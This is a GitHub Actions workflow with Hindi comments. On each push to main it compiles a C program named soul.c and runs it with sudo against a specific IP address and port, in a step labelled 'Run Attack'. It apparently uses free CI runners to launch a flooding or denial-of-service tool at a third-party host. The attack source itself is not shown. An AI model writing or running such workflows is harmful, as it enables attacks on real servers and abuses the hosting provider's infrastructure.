name: Build and Run

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  run-attack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # 1. जरूरी टूल्स इंस्टॉल करें
      - name: Install Dependencies
        run: sudo apt-get update && sudo apt-get install -y gcc libc6-dev

      # 2. GitHub सर्वर पर ही सही आर्किटेक्चर के लिए कंपाइल करें
      - name: Compile C Code
        run: gcc soul.c -o soul -lpthread

      # 3. अब रन करें
      - name: Run Attack
        run: sudo ./soul 20.204.191.192 10407 80
